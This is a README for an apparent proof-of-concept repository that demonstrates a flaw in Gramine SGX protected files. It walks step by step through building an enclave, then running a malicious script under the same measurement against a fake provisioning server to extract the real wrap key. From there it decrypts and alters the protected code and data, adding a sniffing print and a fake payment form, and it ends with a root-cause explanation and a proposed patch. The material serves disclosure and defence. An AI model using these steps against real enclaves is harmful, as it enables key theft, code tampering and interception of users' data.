# gramine-pf-poc

This repository contains a small demonstration of how a flaw in the gramine protected files mechanism can be exploited by an attacker

## Steps to reproduce:

### 1) Build base solution with
```
cd builder
cat Dockerfile
cat python3.10-base.manifest
cat gsc-config-upstream.yaml
cat build-py3.10-base.sh
./build-py3.10-base.sh $PWD/gsc-config-upstream.yaml
cd ..
```

### 2) Encrypt code and data
```
docker run --rm  -it -v ${PWD}/scripts:/scripts -v ${PWD}/data:/data -v ${PWD}/builder:/builder -v ${PWD}/server/keys:/keys \
    --entrypoint /bin/bash gsc-python3.10-base-gramine-poc

openssl genrsa -3 -out /enclave-key.pem 3072

cp /scripts/http_server.py /poc/run/entrypoint.py
sha256sum /poc/run/entrypoint.py

mkdir -p /scripts/http_server_manifest

export PYTHONPATH="\${PYTHONPATH}:$(find /gramine/meson_build_output/lib -type d -path '*/site-packages')"
export PKG_CONFIG_PATH="\${PKG_CONFIG_PATH}:$(find /gramine/meson_build_output/lib -type d -path '*/pkgconfig')"


gramine-sgx-sign -k "/enclave-key.pem" -m "/gramine/app_files/entrypoint.manifest" -o "/scripts/http_server_manifest/entrypoint.manifest.sgx" -s "/scripts/http_server_manifest/entrypoint.sig"
# Remember mrelcnave


# Compare sha256 in manifest with file hash
cat /scripts/http_server_manifest/entrypoint.manifest.sgx | grep /poc/run/entrypoint.py -A1 -B1

gramine-sgx-pf-crypt gen-key -w /keys/wrap-key

gramine-sgx-pf-crypt encrypt -w /keys/wrap-key -i /scripts/http_server.py -o /poc/run/entrypoint.py
mkdir -p /scripts/http_server_enc && mv /poc/run/entrypoint.py /scripts/http_server_enc/

rm -rf /data/encrypted
gramine-sgx-pf-crypt encrypt -w /keys/wrap-key -i /data/ -o /poc/data
mkdir -p /data/encrypted && mv /poc/data/* /data/encrypted/

exit
```

### 3) Make provision server
```
cd server
GRAMINEDIR=~/projects/gramine13/ make
cd ..
```

### 4) Run provision server
```
RA_TLS_ALLOW_OUTDATED_TCB_INSECURE=1 RA_TLS_ALLOW_DEBUG_ENCLAVE_INSECURE=1 ./secret_prov_server_dcap keys/wrap-key 4433
```

### 5) Run enclave
```
docker run --rm -it --device=/dev/sgx_enclave -v /dev/sgx:/dev/sgx -v /var/run/aesmd/aesm.socket:/var/run/aesmd/aesm.socket -v /dev/sgx_provision:/dev/sgx_provision \
    -v ${PWD}/scripts/http_server_enc:/poc/run \
    -v ${PWD}/data/encrypted:/poc/data \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.manifest.sgx:/gramine/app_files/entrypoint.manifest.sgx \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.sig:/gramine/app_files/entrypoint.sig \
    -v ${PWD}/server/certs/cert.pem:/poc/tls/tls-ca.pem \
    -e SECRET_PROVISION_SERVERS="localhost:4433" --network="host" gsc-python3.10-base-gramine-poc
```
### 6) Run browser - http://\<ip\>:8000

### 7) Stop server (Ctrl+C)
### 8) Prepare malicious code
```
docker run --rm  -it -v ${PWD}/scripts:/scripts -v ${PWD}/data:/data -v ${PWD}/builder:/builder \
    -v ${PWD}/server/keys:/keys --entrypoint /bin/bash gsc-python3.10-base-gramine-poc

gramine-sgx-pf-crypt gen-key -w /keys/wrap-key-malicious

gramine-sgx-pf-crypt encrypt -w /keys/wrap-key-malicious -i /scripts/malicious.py -o /poc/run/entrypoint.py
mkdir -p /scripts/malicious_enc && mv /poc/run/entrypoint.py /scripts/malicious_enc/
exit
```
### 9) Run fake provision server:
```
RA_TLS_ALLOW_OUTDATED_TCB_INSECURE=1 RA_TLS_ALLOW_DEBUG_ENCLAVE_INSECURE=1 ./secret_prov_server_dcap keys/wrap-key-malicious 4434
```

### 10) Run malicious
```
docker run --rm --device=/dev/sgx_enclave -v /dev/sgx:/dev/sgx -v /var/run/aesmd/aesm.socket:/var/run/aesmd/aesm.socket -v /dev/sgx_provision:/dev/sgx_provision \
    -v ${PWD}/scripts/malicious_enc:/poc/run \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.manifest.sgx:/gramine/app_files/entrypoint.manifest.sgx \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.sig:/gramine/app_files/entrypoint.sig \
    -v ${PWD}/server/certs/cert.pem:/poc/tls/tls-ca.pem \
    -e SECRET_PROVISION_SERVERS="localhost:4434" --network="host" gsc-python3.10-base-gramine-poc
```

### 11) Convert extracted key to bytes
```
python3
hex_string=".."
f = open("server/keys/extracted_key", "wb+")
f.write(bytes.fromhex(hex_string))
f.close()
Ctrl+D
```

### 12) Diff keys
```
diff server/keys/wrap-key server/keys/extracted_key
```
### 13) Decrypt legal code and data
```
gramine-sgx-pf-crypt decrypt -w server/keys/extracted_key -i scripts/http_server_enc -o scripts/http_server_decrypt
gramine-sgx-pf-crypt decrypt -w server/keys/extracted_key -i data/encrypted/ -o data/decrypted
```

### 14) Open and edit decrypted scripts
```
nano scripts/http_server_decrypt/entrypoint.py
PASTE -> print(post_data_dict, flush=True) # sniff data

nano data/decrypted/index.html
PASTE -> <legend>Malicious payment</legend>
```

### 15) Encrypt the modified data with the extracted key

```
docker run --rm  -it -v ${PWD}/scripts:/scripts -v ${PWD}/data:/data -v ${PWD}/builder:/builder -v ${PWD}/server/keys:/keys \
    --entrypoint /bin/bash gsc-python3.10-base-gramine-poc

gramine-sgx-pf-crypt encrypt -w /keys/extracted_key -i /scripts/http_server_decrypt/entrypoint.py -o /poc/run/entrypoint.py
mkdir -p /scripts/http_server_malicious_enc && mv /poc/run/entrypoint.py /scripts/http_server_malicious_enc/

gramine-sgx-pf-crypt encrypt -w /keys/extracted_key -i /data/decrypted -o /poc/data
mkdir -p /data/malicious_enc && mv /poc/data/* /data/malicious_enc
```

### 16) Run modified enclave
```
docker run --rm -it --device=/dev/sgx_enclave -v /dev/sgx:/dev/sgx -v /var/run/aesmd/aesm.socket:/var/run/aesmd/aesm.socket -v /dev/sgx_provision:/dev/sgx_provision \
    -v ${PWD}/scripts/http_server_malicious_enc:/poc/run \
    -v ${PWD}/data/malicious_enc:/poc/data \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.manifest.sgx:/gramine/app_files/entrypoint.manifest.sgx \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.sig:/gramine/app_files/entrypoint.sig \
    -v ${PWD}/server/certs/cert.pem:/poc/tls/tls-ca.pem \
    -e SECRET_PROVISION_SERVERS="localhost:4433" --network="host" gsc-python3.10-base-gramine-poc
```

### 17) Run browser - http://\<ip\>:8000

### 18) Build image with patched gramine
```
cd builder
cat gsc-config-patched.yaml
./build-py3.10-base.sh $PWD/gsc-config-patched.yaml
cd ..
```
### 19) Resign enclave
```
docker run --rm  -it -v ${PWD}/scripts:/scripts -v ${PWD}/data:/data -v ${PWD}/builder:/builder -v ${PWD}/server/keys:/keys \
    --entrypoint /bin/bash gsc-python3.10-base-gramine-poc

export PYTHONPATH="\${PYTHONPATH}:$(find /gramine/meson_build_output/lib -type d -path '*/site-packages')"
export PKG_CONFIG_PATH="\${PKG_CONFIG_PATH}:$(find /gramine/meson_build_output/lib -type d -path '*/pkgconfig')"

openssl genrsa -3 -out /enclave-key.pem 3072

cp /scripts/http_server.py /poc/run/entrypoint.py
mkdir -p /scripts/http_server_manifest
gramine-sgx-sign -k "/enclave-key.pem" -m "/gramine/app_files/entrypoint.manifest" -o "/scripts/http_server_manifest/entrypoint.manifest.sgx" -s "/scripts/http_server_manifest/entrypoint.sig"
```

### 20) Run enclave
```
docker run --rm -it --device=/dev/sgx_enclave -v /dev/sgx:/dev/sgx -v /var/run/aesmd/aesm.socket:/var/run/aesmd/aesm.socket -v /dev/sgx_provision:/dev/sgx_provision \
    -v ${PWD}/scripts/http_server_enc:/poc/run \
    -v ${PWD}/data/encrypted:/poc/data \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.manifest.sgx:/gramine/app_files/entrypoint.manifest.sgx \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.sig:/gramine/app_files/entrypoint.sig \
    -v ${PWD}/server/certs/cert.pem:/poc/tls/tls-ca.pem \
    -e SECRET_PROVISION_SERVERS="localhost:4433" --network="host" gsc-python3.10-base-gramine-poc
```

### 21) Run modified enclave
```
docker run --rm -it --device=/dev/sgx_enclave -v /dev/sgx:/dev/sgx -v /var/run/aesmd/aesm.socket:/var/run/aesmd/aesm.socket -v /dev/sgx_provision:/dev/sgx_provision \
    -v ${PWD}/scripts/http_server_malicious_enc:/poc/run \
    -v ${PWD}/data/malicious_enc:/poc/data \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.manifest.sgx:/gramine/app_files/entrypoint.manifest.sgx \
    -v ${PWD}/scripts/http_server_manifest/entrypoint.sig:/gramine/app_files/entrypoint.sig \
    -v ${PWD}/server/certs/cert.pem:/poc/tls/tls-ca.pem \
    -e SECRET_PROVISION_SERVERS="localhost:4433" --network="host" gsc-python3.10-base-gramine-poc
```

## What is the problem and how to solve it:
When preparing an enclave, a manifest (.manifest.sgx) file is created that contains the necessary information about the enclave, including hashes of trusted files.
Manifest hash affects enclave measurement. When trying to access trusted files, their integrity is checked. However, if the file is both trusted and protected, its integrity is not checked, only the validity of the key is checked.
Thus, an attacker can replace a protected file without changing the enclave measurement. A server can only trust an enclave based on its measurements.
And since the measurements does not change, the server gives the key to the one to whom it is not intended.
One solution is to modify the gramine: add file integrity check based on the hash (of an unencrypted file for example) calculated during the enclave preparation phase
